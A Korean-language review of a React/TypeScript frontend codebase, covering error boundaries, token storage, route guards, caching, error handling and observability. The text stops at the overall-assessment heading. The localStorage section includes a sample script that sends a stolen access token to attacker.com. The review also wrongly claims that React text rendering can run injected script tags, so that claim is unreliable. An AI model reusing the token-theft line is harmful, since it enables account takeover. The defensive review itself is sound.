# 🎨 프론트엔드 전체 코드베이스 개선 리뷰

> **리뷰 기준일**: 2024년 기준  
> **프레임워크**: React 19.2.0 + Vite + TypeScript  
> **상태 관리**: Zustand  
> **라우팅**: React Router v7

---

## 🚨 치명적인 문제 (즉시 개선 필요)

### 1. Error Boundary 부재로 인한 전체 앱 크래시 위험

**문제 설명:**
- React Error Boundary가 전혀 구현되어 있지 않음
- 컴포넌트 렌더링 중 예외 발생 시 전체 앱이 하얀 화면으로 전환됨
- `FEATURE_ROADMAP.md`에 계획만 있고 실제 구현 없음

**실제 사용자 영향:**
- API 응답 파싱 실패, 타입 에러, undefined 접근 등으로 인한 예외 발생 시 사용자가 앱을 완전히 사용 불가
- 에러 로깅/모니터링 불가능 → 프로덕션에서 버그 추적 어려움

**장애 시나리오:**
```typescript
// 예: src/features/prompt/ui/HomeFeedView.tsx:104
const newPrompts = response.data.data.content; // response.data.data가 undefined면?
// → 전체 앱 크래시, 사용자는 하얀 화면만 보게 됨
```

**구체적인 개선 방향:**
1. **즉시 구현**: `src/shared/components/ErrorBoundary.tsx` 생성
2. `App.tsx` 최상위에 Error Boundary 래핑
3. 에러 발생 시 사용자 친화적 폴백 UI + 재시도 버튼 제공
4. 에러 정보를 외부 모니터링 서비스(Sentry 등)로 전송

```typescript
// 권장 구조
<ErrorBoundary fallback={<ErrorFallback />} onError={logErrorToService}>
  <App />
</ErrorBoundary>
```

---

### 2. 환경 변수 검증 부재로 인한 런타임 에러 위험

**문제 설명:**
- `src/shared/config/env.ts`에서 환경 변수를 단순히 읽기만 함
- `VITE_API_BASE_URL`이 없으면 `undefined`로 API 호출 시도 → 모든 API 호출 실패
- 빌드 시점이 아닌 런타임에만 발견됨

**실제 사용자 영향:**
- 배포 환경에서 환경 변수 누락 시 앱이 조용히 실패
- 사용자는 "네트워크 오류" 같은 모호한 메시지만 보게 됨

**장애 시나리오:**
```typescript
// src/shared/api/axios.ts:16
const API_BASE_URL = import.meta.env.VITE_API_BASE_URL; // undefined일 수 있음
export const api = axios.create({ baseURL: API_BASE_URL }); // baseURL: undefined
// → 모든 API 요청이 상대 경로로 가거나 실패
```

**구체적인 개선 방향:**
```typescript
// src/shared/config/env.ts
const requiredEnvVars = {
  VITE_API_BASE_URL: import.meta.env.VITE_API_BASE_URL,
  VITE_OAUTH2_REDIRECT_FRONT_URL: import.meta.env.VITE_OAUTH2_REDIRECT_FRONT_URL,
} as const;

// 런타임 검증
Object.entries(requiredEnvVars).forEach(([key, value]) => {
  if (!value) {
    throw new Error(`Missing required environment variable: ${key}`);
  }
});

export const ENV = requiredEnvVars;
```

---

### 3. localStorage에 토큰 저장으로 인한 XSS 취약점

**문제 설명:**
- `src/features/auth/store/auth.store.ts`에서 `accessToken`, `refreshToken`을 `localStorage`에 저장
- XSS 공격 시 JavaScript로 토큰 탈취 가능
- `httpOnly` 쿠키 대비 보안성 낮음

**실제 사용자 영향:**
- 악성 스크립트 주입 시 사용자 토큰 유출 → 계정 탈취
- 특히 서드파티 라이브러리나 CDN에서 로드된 스크립트에 취약

**장애 시나리오:**
```javascript
// 악성 스크립트 예시
const token = localStorage.getItem('accessToken');
fetch('https://attacker.com/steal', { method: 'POST', body: token });
```

**구체적인 개선 방향:**
1. **단기**: `httpOnly` 쿠키로 전환 (백엔드 협업 필요)
2. **중기**: 토큰을 메모리에만 저장하고, refresh token만 `httpOnly` 쿠키에 저장
3. **보완**: CSP(Content Security Policy) 헤더 강화, XSS 방지 라이브러리 도입

```typescript
// 권장: 메모리 저장 + httpOnly 쿠키
// localStorage 대신 메모리 상태만 사용
// refresh token은 백엔드에서 httpOnly 쿠키로 설정
```

---

### 4. 5xx 서버 에러에 대한 사용자 친화적 처리 부족

**문제 설명:**
- `src/shared/api/axios.ts`의 response interceptor에서 401, 429만 처리
- 500, 502, 503 등 서버 에러는 그대로 사용자에게 전달됨
- 네트워크 타임아웃(30초) 후에도 명확한 에러 메시지 없음

**실제 사용자 영향:**
- 서버 장애 시 사용자가 "Network Error" 같은 기술적 메시지만 보게 됨
- 재시도 로직이 없어 사용자가 수동으로 새로고침해야 함

**장애 시나리오:**
```typescript
// 서버 500 에러 발생 시
// → axios interceptor에서 처리 안 됨
// → 컴포넌트에서 catch하지 않으면 에러가 그대로 노출
// → 사용자 경험 저하
```

**구체적인 개선 방향:**
```typescript
// src/shared/api/axios.ts response interceptor에 추가
if (axiosError.response?.status >= 500) {
  // 사용자 친화적 메시지
  return Promise.reject(new Error('서버에 일시적인 문제가 발생했습니다. 잠시 후 다시 시도해주세요.'));
}

// 네트워크 에러 처리
if (!axiosError.response && axiosError.request) {
  return Promise.reject(new Error('네트워크 연결을 확인해주세요.'));
}
```

---

### 5. 코드 스플리팅 부재로 인한 초기 로딩 성능 저하

**문제 설명:**
- 모든 페이지 컴포넌트가 메인 번들에 포함됨
- `App.tsx`에서 모든 라우트를 동기적으로 import
- 초기 로딩 시 불필요한 코드까지 다운로드

**실제 사용자 영향:**
- 초기 번들 크기 증가 → 첫 화면 로딩 시간 증가
- 모바일/느린 네트워크 환경에서 사용자 이탈 증가
- LCP(Largest Contentful Paint) 지표 악화

**장애 시나리오:**
```typescript
// src/app/App.tsx - 모든 페이지가 동기 import
import AdminPage from "@/pages/AdminPage"; // 관리자 페이지도 초기 로딩에 포함
import SettingsPage from "@/pages/SettingsPage"; // 설정 페이지도 초기 로딩에 포함
// → 대부분의 사용자가 사용하지 않는 코드까지 다운로드
```

**구체적인 개선 방향:**
```typescript
// React.lazy + Suspense 적용
const AdminPage = lazy(() => import("@/pages/AdminPage"));
const SettingsPage = lazy(() => import("@/pages/SettingsPage"));

<Suspense fallback={<PageLoader />}>
  <Routes>...</Routes>
</Suspense>
```

---

### 6. 라우트 가드 부재로 인한 보안 취약점

**문제 설명:**
- 보호된 라우트(`/admin`, `/settings`, `/prompts/create` 등)에 대한 인증/권한 체크가 없음
- `App.tsx`에서 모든 라우트가 동일하게 노출됨
- 비인증 사용자도 관리자 페이지에 접근 시도 가능

**실제 사용자 영향:**
- 비인증 사용자가 보호된 페이지 접근 시도 → API 401 에러만 발생
- 관리자 페이지에 비관리자 접근 시도 → 서버에서 거부하지만 클라이언트에서 불필요한 요청 발생
- 사용자 경험 저하 (에러 메시지 없이 빈 화면 또는 로딩만 표시)

**장애 시나리오:**
```typescript
// src/app/App.tsx - 모든 라우트가 동일하게 노출
<Route path="/admin" element={<AdminPage />} /> // 인증 체크 없음
<Route path="/settings" element={<SettingsPage />} /> // 인증 체크 없음
// → 비인증 사용자도 접근 가능, API 호출 후 401 에러만 발생
```

**구체적인 개선 방향:**
1. **ProtectedRoute 컴포넌트 생성**: 인증 체크 후 미인증 시 로그인 페이지로 리다이렉트
2. **AdminRoute 컴포넌트 생성**: 관리자 권한 체크
3. **라우트 레벨에서 사전 차단**: API 호출 전에 클라이언트에서 차단

```typescript
// 권장 구조
<Route 
  path="/admin" 
  element={
    <ProtectedRoute requireAdmin>
      <AdminPage />
    </ProtectedRoute>
  } 
/>
```

---

### 7. 동시 Refresh Token 요청으로 인한 토큰 무효화 위험

**문제 설명:**
- `src/shared/api/axios.ts`의 response interceptor에서 401 발생 시 refresh token으로 갱신
- 여러 요청이 동시에 401을 받으면 refresh token API가 중복 호출됨
- 백엔드에서 refresh token을 한 번만 사용 가능하도록 구현되어 있다면, 두 번째 요청이 실패하여 모든 요청이 실패할 수 있음

**실제 사용자 영향:**
- 여러 탭에서 동시에 사용하거나, 빠르게 여러 API를 호출할 때 refresh token이 무효화됨
- 사용자가 갑자기 로그아웃되는 현상 발생
- 특히 SSE 연결과 일반 API 호출이 동시에 401을 받으면 문제 발생

**장애 시나리오:**
```typescript
// 동시에 3개 요청이 401을 받음
// → 3개의 refresh 요청이 동시에 발생
// → 백엔드에서 첫 번째만 성공, 나머지는 refresh token 무효화로 실패
// → 모든 요청이 실패하고 사용자는 로그아웃됨
```

**구체적인 개선 방향:**
```typescript
// refresh token 요청을 큐에 넣고, 진행 중인 refresh가 있으면 대기
let refreshPromise: Promise<string> | null = null;

if (axiosError.response?.status === 401 && !originalRequest._retry) {
  originalRequest._retry = true;
  
  if (!refreshPromise) {
    refreshPromise = refreshTokenAndGetNewAccessToken();
  }
  
  const newAccessToken = await refreshPromise;
  // 원래 요청 재시도
}
```

---

### 8. 오프라인 상태 처리 부재

**문제 설명:**
- 네트워크 연결이 끊겼을 때 사용자에게 알림 없음
- Service Worker나 오프라인 감지 로직 없음
- 오프라인 상태에서도 API 호출 시도 → 실패만 반복
- 오프라인에서 작성한 데이터 손실 위험

**실제 사용자 영향:**
- 네트워크 불안정 시 사용자가 원인을 알 수 없음
- 오프라인에서 작성한 폼 데이터가 저장되지 않음
- 모바일 환경에서 데이터 요금 낭비 (실패한 요청 반복)

**장애 시나리오:**
```typescript
// 네트워크가 끊긴 상태에서 사용자가 프롬프트 작성
// → API 호출 실패하지만 사용자에게 알림 없음
// → 사용자는 계속 시도하다가 작성한 내용 손실
```

**구체적인 개선 방향:**
1. `navigator.onLine` 이벤트 리스너로 오프라인 감지
2. 오프라인 상태 표시 UI (토스트, 배너 등)
3. Service Worker로 오프라인 캐싱 (선택적)
4. IndexedDB로 오프라인 데이터 임시 저장

---

### 9. 로딩/에러/빈 상태 처리의 일관성 부족

**문제 설명:**
- 컴포넌트마다 로딩/에러/빈 상태 UI가 다름
- 일부는 스피너, 일부는 텍스트만 표시
- 에러 메시지 형식이 통일되지 않음
- 빈 상태(Empty State) 처리가 누락된 곳이 많음

**실제 사용자 영향:**
- 사용자가 일관성 없는 UX를 경험
- 에러 발생 시 어떤 조치를 취해야 할지 불명확
- 빈 상태에서 사용자가 다음 행동을 알 수 없음

**기술 부채:**
```typescript
// src/features/prompt/ui/HomeFeedView.tsx:166
{isLoading && filteredPrompts.length === 0 && (
  <div className="text-center py-20">
    <p>프롬프트를 불러오는 중...</p> // 단순 텍스트
  </div>
)}

// src/features/prompt/ui/PromptDetailView.tsx:64
if (isLoading) {
  return <div>로딩 중...</div>; // 다른 스타일
}
```

**구체적인 개선 방향:**
1. 공통 로딩/에러/빈 상태 컴포넌트 생성 (`LoadingState`, `ErrorState`, `EmptyState`)
2. 모든 페이지에서 일관된 패턴 사용
3. 스켈레톤 UI 도입으로 로딩 UX 개선

---

### 10. 테스트 코드 전무로 인한 리팩토링 리스크

**문제 설명:**
- 프로젝트 전체에 단위 테스트, 통합 테스트, E2E 테스트가 전혀 없음
- 리팩토링 시 회귀 버그 발견 어려움
- CI/CD 파이프라인에서 품질 검증 불가

**실제 사용자 영향:**
- 기능 추가/수정 시 기존 기능이 깨질 위험
- 배포 후 프로덕션에서만 버그 발견
- 버그 수정 비용 증가

**구체적인 개선 방향:**
1. **우선순위 높음**: API 레이어, 인증 로직, 상태 관리 로직에 단위 테스트
2. **중기**: 주요 사용자 플로우에 E2E 테스트 (Playwright/Cypress)
3. **CI 통합**: 테스트 실패 시 배포 차단

---

## ⚠️ 구조적 개선 필요 (중기)

### 1. 컴포넌트 책임 분리 부족 (God Component 경향)

**문제 설명:**
- `PromptDetailView`가 프롬프트 상세, 댓글, 관련 프롬프트, 모달 등 모든 것을 관리
- `SettingsView`가 7개의 탭과 모든 설정 로직을 한 컴포넌트에서 처리
- 컴포넌트가 너무 많은 책임을 가져 유지보수 어려움

**기술 부채:**
```typescript
// src/features/prompt/ui/PromptDetailView.tsx:11-62
export function PromptDetailView() {
  const {
    // 62개의 props를 받음
    prompt, comments, relatedPrompts, isLoading, error,
    liked, bookmarked, copied, showMore, commentText,
    // ... 너무 많은 상태와 로직
  } = usePromptDetailView();
  // → 단일 컴포넌트가 너무 많은 책임
}
```

**리팩토링 전략:**
1. 컴포넌트를 더 작은 단위로 분리
2. 컨테이너-프레젠테이션 패턴 적용
3. 각 컴포넌트는 단일 책임만 가지도록 리팩토링

---

### 2. 캐시 무효화 전략의 일관성 부족

**문제 설명:**
- `src/shared/utils/cache.ts`에 캐시 무효화 메커니즘이 있지만, 실제 사용이 제한적
- POST/PATCH/DELETE 후 관련 GET 캐시를 자동으로 무효화하지 않음
- 예: 프롬프트 좋아요 후 목록 캐시가 갱신되지 않음

**기술 부채:**
```typescript
// src/features/prompt/model/useHomeFeedView.ts:109-124
const toggleLike = async (id: number) => {
  const response = await baseToggleLike(id);
  // 좋아요 후 프롬프트 목록 캐시를 무효화하지 않음
  // → 사용자가 새로고침해야 최신 상태를 볼 수 있음
};
```

**리팩토링 전략:**
1. API 호출 후 관련 캐시 자동 무효화 훅 생성
2. 예: `useInvalidateCache(['/prompts'])` 같은 패턴 도입
3. 또는 TanStack Query 같은 서버 상태 관리 라이브러리 도입 검토

---

### 3. 중복 요청 방지 로직의 부분적 적용

**문제 설명:**
- `src/shared/utils/rateLimit.ts`에 `getOrCreateRequest`가 있지만, 모든 API 호출에 적용되지 않음
- `usePromptList`에서는 사용하지만, 다른 훅에서는 사용하지 않음
- 동일한 API를 여러 컴포넌트에서 동시 호출 시 중복 요청 발생 가능

**기술 부채:**
- 좋아요 상태 조회, 알림 목록 조회 등에서 중복 요청 가능성
- Rate Limit 초과 위험 증가

**리팩토링 전략:**
1. axios interceptor 레벨에서 중복 요청 방지 적용
2. 또는 모든 커스텀 훅에서 `rateLimitTracker.getOrCreateRequest` 사용 강제

---

### 4. 메모이제이션 사용의 제한적 적용

**문제 설명:**
- `useMemo`, `useCallback` 사용이 일부 훅에만 국한됨
- 컴포넌트 리렌더링 최적화가 부족
- 특히 리스트 렌더링 시 `React.memo` 미적용

**기술 부채:**
```typescript
// src/features/prompt/ui/HomeFeedView.tsx:178
{filteredPrompts.map((prompt) => (
  <PromptCard key={prompt.id} ... /> // React.memo 없음
))}
// → 부모 리렌더링 시 모든 PromptCard가 리렌더링됨

// src/features/prompt/ui/components/PromptCard.tsx
export function PromptCard({ ... }) { ... } // React.memo 없음
// → 홈 피드에서 20개 카드가 모두 리렌더링됨
```

**리팩토링 전략:**
1. 리스트 아이템 컴포넌트에 `React.memo` 적용
2. 콜백 함수는 `useCallback`으로 메모이제이션
3. 다만, 오남용 주의 (의존성 배열 관리 복잡도 증가)
4. 성능 프로파일링으로 실제 병목 지점 확인 후 적용

---

### 5. 서버 상태 vs 클라이언트 상태 구분의 모호함

**문제 설명:**
- Zustand로 모든 상태를 관리하는 경향
- 서버에서 가져온 데이터(프롬프트 목록, 좋아요 상태)도 클라이언트 상태처럼 관리
- 서버 상태의 캐싱, 동기화, 무효화 전략이 일관되지 않음

**기술 부채:**
- TanStack Query 같은 서버 상태 관리 라이브러리 도입 검토 필요
- 현재는 수동으로 캐싱/무효화를 관리해야 함

**리팩토링 전략:**
1. 서버 상태는 TanStack Query로 관리
2. 클라이언트 상태(UI 상태, 폼 상태)만 Zustand로 관리
3. 점진적 마이그레이션 전략 수립

---

### 6. 에러 처리의 일관성 부족

**문제 설명:**
- 컴포넌트마다 에러 처리 방식이 다름
- 일부는 `try-catch`, 일부는 에러 상태만 표시
- 사용자에게 보여주는 에러 메시지 형식이 통일되지 않음

**기술 부채:**
```typescript
// src/features/auth/ui/LoginView.tsx:39
catch { setError("로그인에 실패했습니다"); } // 구체적 에러 정보 없음

// src/features/prompt/ui/HomeFeedView.tsx:159
{error && <p>{error.message}</p>} // 기술적 메시지 그대로 노출
```

**리팩토링 전략:**
1. 공통 에러 처리 훅 생성: `useErrorHandler`
2. 에러 타입별 사용자 친화적 메시지 매핑
3. Toast/Alert 시스템 도입으로 일관된 에러 표시

---

### 7. XSS 방지를 위한 입력 검증 및 Sanitization 부재

**문제 설명:**
- 사용자 입력(닉네임, 댓글, 프롬프트 내용 등)이 그대로 렌더링됨
- `dangerouslySetInnerHTML`은 사용하지 않지만, 사용자 입력에 HTML/스크립트가 포함될 경우 위험
- 특히 댓글, 프롬프트 설명 등에서 XSS 공격 가능

**기술 부채:**
```typescript
// src/features/prompt/ui/components/PromptCard.tsx:90
<p>{prompt.description}</p> // 사용자 입력이 그대로 렌더링
// → description에 <script> 태그가 포함되면 실행될 수 있음
```

**리팩토링 전략:**
1. `DOMPurify` 같은 sanitization 라이브러리 도입
2. 사용자 입력 렌더링 시 자동 sanitization 적용
3. 마크다운 렌더링 시에도 sanitization 필수

---

### 8. Open Redirect 취약점 가능성

**문제 설명:**
- `src/features/auth/api/oauth.ts`에서 `window.location.href`로 리다이렉트
- OAuth 성공/실패 후 리다이렉트 URL 검증이 클라이언트에서 이루어지지 않음
- 백엔드에서 검증하더라도, 클라이언트에서도 화이트리스트 기반 검증 필요

**기술 부채:**
```typescript
// src/features/auth/api/oauth.ts:4
window.location.href = `${BASE_URL}/oauth2/authorization/${provider}`;
// → provider 값 검증 없음 (다만 타입으로 제한되어 있음)

// src/pages/auth/OAuthSuccessPage.tsx:40
window.history.replaceState({}, "", "/"); // 하드코딩된 경로
// → 리다이렉트 URL 파라미터가 있다면 검증 필요
```

**리팩토링 전략:**
1. 리다이렉트 URL 화이트리스트 검증
2. 상대 경로만 허용, 절대 경로는 화이트리스트와 비교
3. OAuth 콜백 URL 검증 강화

---

### 9. API 호출 최소화 전략의 확장성 한계

**문제 설명:**
- Rate Limit 대응을 위해 배치 요청(`batchRequests`)과 캐싱을 사용
- 화면이 복잡해질수록 "한 번의 호출에 너무 많은 의미"가 실리기 쉬움
- 단일 API 실패 시 화면 전체가 영향을 받는 구조로 발전 가능
- 부분 데이터 갱신이 어려워 전체 요청을 다시 보내야 하는 상황 발생

**실제 운영 영향:**
- 협업 인원이 늘어나면 "이 API를 건드리면 어디까지 영향이 가는지" 파악이 어려워짐
- UX 개선 요구가 들어오는 시점에 다시 손댈 확률 높음
- 기능 추가 시 기존 배치 로직과 충돌 가능성

**기술 부채:**
```typescript
// src/features/prompt/hooks/usePromptLikes.ts:108
const results = await batchRequests(requests, {
  maxConcurrent: 5, // 동시에 최대 5개
  delayBetweenBatches: 100,
});
// → 좋아요 상태만 배치로 처리하지만, 다른 데이터와 결합되면 복잡도 증가

// src/features/user/ui/UserProfileView.tsx:117
const likeStatuses = await Promise.allSettled(/* 여러 API 호출 */);
// → Promise.allSettled로 병렬 처리하지만, 하나 실패 시 전체 영향
```

**리팩토링 전략:**
1. **API 호출 전략 분리**: 
   - 필수 데이터와 선택적 데이터 분리
   - 부분 실패 시에도 필수 데이터는 표시
2. **의존성 그래프 명시화**: 
   - API 간 의존성을 문서화
   - 영향 범위 파악 도구 구축
3. **점진적 로딩 패턴**: 
   - 초기에는 필수 데이터만 로드
   - 추가 데이터는 점진적으로 로드
4. **에러 격리**: 
   - 한 API 실패가 다른 API에 영향 주지 않도록 설계

---

### 10. 에러 처리 기준과 사용자 경험의 불일치

**문제 설명:**
- 백엔드에서 429, 400, 인증 관련 에러를 명확히 내려주더라도
- 프론트에서 이를 동일한 UX로 처리하고 있음
- Rate Limit 초과와 실제 장애를 사용자가 구분하지 못함
- retry 가능한 에러와 불가능한 에러가 UX 상 동일하게 보임

**실제 운영 영향:**
- 장기 운영 시 "왜 이탈했는지" 로그로 설명이 안 되는 상황 발생
- 기능 확장보다는 CS/운영 이슈로 다시 손대게 될 가능성 큼
- 사용자 불만 증가 → 이탈률 증가

**기술 부채:**
```typescript
// src/shared/api/axios.ts:130-157
if (axiosError.response?.status === 429) {
  // Rate Limit 에러 처리
  // → 사용자에게는 "요청이 너무 많습니다" 같은 메시지만 표시
  // → 재시도 가능한지, 언제 재시도해야 하는지 명확하지 않음
}

// src/features/auth/ui/LoginView.tsx:39
catch { setError("로그인에 실패했습니다"); }
// → 모든 에러를 동일하게 처리
// → 400 (잘못된 입력), 401 (인증 실패), 500 (서버 장애) 구분 없음
```

**리팩토링 전략:**
1. **에러 타입별 UX 차별화**:
   - 429 (Rate Limit): "잠시 후 다시 시도해주세요" + 재시도 버튼
   - 400 (잘못된 요청): 구체적인 필드별 에러 메시지
   - 401 (인증 실패): "다시 로그인해주세요" + 로그인 페이지로 이동
   - 500 (서버 장애): "일시적인 문제가 발생했습니다" + 재시도 버튼
2. **에러 분류 시스템 구축**:
   - Retry 가능 여부 표시
   - 사용자 행동 가이드 제공
3. **에러 로깅 강화**:
   - 사용자 이탈 시점의 에러 타입 추적
   - 에러별 이탈률 분석

---

### 11. 관측성 부족으로 인한 프론트 장애 추적 한계

**문제 설명:**
- 현재 구조는 정상 동작 기준으로는 충분하지만
- 실제 운영에서는 "프론트에서 무슨 일이 있었는지"가 보이지 않는 순간이 옴
- 백엔드는 정상 로그가 있는데 프론트 사용자만 실패했다고 느끼는 케이스
- 네트워크 지연, 모바일 환경, 브라우저별 이슈가 서버 로그로는 설명되지 않음

**실제 운영 영향:**
- 트래픽 증가 후 장애 재현 불가 이슈가 쌓이면서 다시 손댈 가능성 있음
- 사용자 리포트와 서버 로그가 일치하지 않아 원인 파악 어려움
- 모바일/특정 브라우저에서만 발생하는 이슈 추적 불가능

**기술 부채:**
```typescript
// 현재 코드베이스에는 에러 로깅/모니터링 시스템이 없음
// console.error만 사용
// → 프로덕션에서 실제 에러 추적 불가능

// src/features/prompt/model/useHomeFeedView.ts:122
catch (error) {
  console.error('Failed to toggle like:', error);
  // → 에러 정보가 외부로 전송되지 않음
  // → 사용자 환경 정보(브라우저, OS, 네트워크) 없음
}
```

**리팩토링 전략:**
1. **에러 모니터링 서비스 연동**:
   - Sentry, LogRocket 등 도입
   - 에러 발생 시 자동으로 컨텍스트 정보 수집
2. **성능 모니터링**:
   - API 응답 시간 추적
   - 느린 네트워크 환경 감지
   - Core Web Vitals 측정
3. **사용자 행동 추적**:
   - 에러 발생 전 사용자 행동 로그
   - 재현 경로 파악
4. **클라이언트 로깅 시스템**:
   - 브라우저, OS, 네트워크 정보 수집
   - 에러 발생 시점의 상태 스냅샷

---

### 12. 정책 변경 시 프론트 수정 범위 확대 위험

**문제 설명:**
- Rate Limit, 인증 만료, 재로그인 정책 등이 바뀌면
- 프론트 여러 화면에서 동시에 영향을 받을 구조
- "로그인 갱신 방식 변경", "특정 API만 제한 완화", "관리자/일반 사용자 정책 분리" 같은 요구가 나오는 순간
- 영향 범위 파악 → 수정 → 검증 비용이 급격히 증가할 가능성

**실제 운영 영향:**
- 정책 변경 시 프론트 전체를 수정해야 하는 상황 발생
- 테스트 범위가 넓어져 배포 지연
- 버그 발생 시 롤백 범위도 넓어짐

**기술 부채:**
```typescript
// src/shared/api/axios.ts:160-191
// 401 에러 처리 로직이 interceptor에 하드코딩됨
if (axiosError.response?.status === 401 && !originalRequest._retry) {
  // refresh → retry 로직
  // → 정책 변경 시 이 부분만 수정하면 되지만,
  // → 다른 곳에서도 인증 관련 로직이 분산되어 있을 수 있음
}

// src/shared/utils/rateLimit.ts
// Rate Limit 정책이 코드에 하드코딩됨
maxRequests: 100,
windowMs: 60000,
// → 정책 변경 시 코드 수정 필요
```

**리팩토링 전략:**
1. **정책 설정 외부화**:
   - 환경 변수 또는 설정 API로 정책 관리
   - 런타임에 정책 변경 가능하도록 설계
2. **정책 관리 중앙화**:
   - 모든 인증/Rate Limit 정책을 한 곳에서 관리
   - 정책 변경 시 영향 범위 명확히 파악
3. **Feature Flag 활용**:
   - 정책 변경을 Feature Flag로 관리
   - 점진적 롤아웃 및 롤백 용이
4. **정책 문서화**:
   - 정책 변경 시 영향 받는 화면/기능 명시
   - 변경 가이드라인 수립

---

## ♻️ 개선하면 좋은 부분 (우선순위 낮음)

### 1. 타입 안정성 강화

**현재 상태:**
- `any` 타입 사용이 일부 존재
- 예: `src/features/auth/hooks/useAuth.ts:10-12`에서 `extractTokenData`의 반환 타입이 `any` 기반

**개선 방향:**
- `any` 제거, 엄격한 타입 정의
- `unknown` 사용 후 타입 가드 적용

---

### 2. 접근성(A11y) 개선

**현재 상태:**
- 키보드 네비게이션, 스크린 리더 지원이 제한적
- 버튼에 `aria-label` 부족
- 포커스 관리 부족

**개선 방향:**
- 주요 인터랙티브 요소에 ARIA 속성 추가
- 키보드 네비게이션 테스트

---

### 3. 번들 분석 및 최적화

**현재 상태:**
- 번들 크기 분석 도구 미사용
- 불필요한 의존성 포함 가능성

**개선 방향:**
- `vite-bundle-visualizer` 도입
- 큰 의존성 대체 검토 (예: `lucide-react` 트리 쉐이킹 확인)

---

### 4. 환경별 설정 분리

**현재 상태:**
- 개발/스테이징/프로덕션 환경 구분이 명확하지 않음
- `.env` 파일 관리 전략 부재

**개선 방향:**
- `.env.development`, `.env.production` 분리
- 환경 변수 검증 스크립트 추가

---

### 5. 커스텀 훅의 과도한 책임 (God Hook)

**현재 상태:**
- `usePromptDetailView`가 62개의 값을 반환 (프롬프트, 댓글, 좋아요, 북마크, 신고 등 모든 로직 포함)
- `useSettingsPage`도 프로필, 보안, 알림, 외모 등 모든 설정 로직을 한 훅에 집중
- 단일 책임 원칙 위반, 테스트 및 유지보수 어려움

**기술 부채:**
```typescript
// src/features/prompt/model/usePromptDetailView.ts
export function usePromptDetailView() {
  // 프롬프트 조회, 댓글, 좋아요, 북마크, 복사, 신고, 수정, 삭제 등
  // → 62개의 반환값, 너무 많은 책임
  return {
    prompt, comments, liked, bookmarked, copied, showMore,
    commentText, showAllComments, likedComments, isSubmittingComment,
    isOwner, currentUserId, showEditModal, showDeleteModal, isDeleting,
    editingCommentId, editingText, isUpdatingComment, isDeletingComment,
    // ... 40개 이상의 추가 값들
  };
}
```

**리팩토링 전략:**
1. 훅을 기능별로 분리: `usePromptDetail`, `useComments`, `usePromptActions` 등
2. 컴포지션 패턴 사용: 작은 훅들을 조합하여 사용
3. 컨텍스트 API 고려: 깊은 prop drilling이 발생하는 경우

---

### 6. 폰트 로딩 최적화 부재

**현재 상태:**
- `src/app/index.css`에서 Pretendard 폰트를 전체 로드 (`@import "pretendard/dist/web/static/pretendard.css"`)
- `font-display` 속성 없음 → FOIT(Flash of Invisible Text) 발생 가능
- 폰트 preload 없음 → 초기 로딩 지연

**기술 부채:**
```css
/* src/app/index.css:1 */
@import "pretendard/dist/web/static/pretendard.css";
/* → 모든 폰트 웨이트가 로드됨 (400, 500, 700 등) */
/* → font-display: swap 없음 */
```

**리팩토링 전략:**
1. `index.html`에 폰트 preload 추가
2. `font-display: swap` 적용으로 FOIT 방지
3. 필요한 폰트 웨이트만 로드 (subset)

---

### 7. Feature Flag 시스템 부재

**현재 상태:**
- 기능별 점진적 롤아웃을 위한 Feature Flag 시스템 없음
- 새 기능 배포 시 모든 사용자에게 즉시 노출
- 문제 발생 시 즉시 롤백 불가능

**실제 사용자 영향:**
- 새 기능에 버그가 있어도 모든 사용자가 영향받음
- A/B 테스트 불가능
- 긴급 상황 시 기능 비활성화 불가능

**리팩토링 전략:**
1. Feature Flag 라이브러리 도입 (LaunchDarkly, Flagsmith 등) 또는 자체 구현
2. 환경 변수 기반 간단한 Feature Flag 시스템 구축
3. 백엔드 API로 Feature Flag 관리 (동적 on/off)

---

### 8. 배포 롤백 전략 부재

**현재 상태:**
- 배포 실패 시 자동 롤백 메커니즘 없음
- 빌드 산출물 버전 관리 부재
- 이전 버전으로 복구 프로세스 불명확

**실제 사용자 영향:**
- 배포 후 문제 발생 시 수동으로 롤백해야 함
- 롤백 시간 동안 사용자 영향 지속
- 배포 실패 시 서비스 중단 가능

**리팩토링 전략:**
1. CI/CD 파이프라인에 헬스 체크 및 자동 롤백 추가
2. 빌드 산출물 버전 관리 (S3, Artifactory 등)
3. 블루-그린 배포 또는 카나리 배포 전략 검토

---

## 💡 잘한 설계 & 유지하면 좋은 부분

### 1. Feature 기반 폴더 구조

**장점:**
- 기능별로 코드가 명확히 분리됨
- 새로운 기능 추가 시 영향 범위가 명확함
- 팀 협업 시 충돌 최소화

**유지 포인트:**
- `features/` 내부의 `api/`, `model/`, `ui/`, `types/` 구조 일관성 유지
- 공통 로직은 `shared/`로 이동

---

### 2. Rate Limit 대응 전략

**장점:**
- `src/shared/utils/rateLimit.ts`에서 사전 Rate Limit 방지
- 429 에러 발생 시 자동 재시도 로직
- 요청 추적 및 통계 제공

**유지 포인트:**
- 백엔드 Rate Limit 정책 변경 시 설정값 조정 용이하도록 구성
- 모니터링 대시보드 연동 고려

---

### 3. 토큰 갱신 자동화

**장점:**
- `src/shared/api/axios.ts`에서 401 발생 시 자동 refresh → retry
- 사용자가 인증 만료를 인지하지 않고 사용 가능
- 로그아웃 중 요청 차단으로 상태 불일치 방지

**유지 포인트:**
- Refresh token 만료 시 처리 로직 강화 (현재는 로그인 페이지로만 리다이렉트)
- 동시 요청 시 refresh 중복 호출 방지 로직 확인 필요

---

### 4. AbortController를 통한 요청 취소

**장점:**
- `usePromptList`에서 컴포넌트 언마운트 시 요청 취소
- 불필요한 네트워크 요청 및 상태 업데이트 방지
- 메모리 누수 방지

**유지 포인트:**
- 모든 비동기 훅에 동일 패턴 적용
- React Query 도입 시 자동으로 처리되지만, 현재 구조에서도 일관성 유지

---

### 5. URL 파라미터와 상태 동기화

**장점:**
- `useSearchParamsSync`로 필터/정렬 상태를 URL에 반영
- 북마크, 공유 시 상태 유지
- 브라우저 뒤로 가기/앞으로 가기 지원

**유지 포인트:**
- 다른 페이지에서도 동일 패턴 적용
- URL 파라미터 검증 로직 추가 고려

---

### 6. Debounce를 통한 API 호출 최적화

**장점:**
- `useDebounce`로 검색/필터 입력 시 불필요한 API 호출 방지
- Rate Limit 준수에 기여

**유지 포인트:**
- Debounce 시간을 기능별로 조정 가능하도록 설정화

---

## 🧭 전체 총평

### 프론트엔드 성숙도 평가

**현재 단계: 중급 → 고급 전환기**

**강점:**
- ✅ Feature 기반 아키텍처로 확장성 좋음
- ✅ Rate Limit, 캐싱, 토큰 갱신 등 실서비스 고려사항 반영
- ✅ TypeScript로 타입 안정성 확보
- ✅ 커스텀 훅으로 로직 재사용성 높음

**약점:**
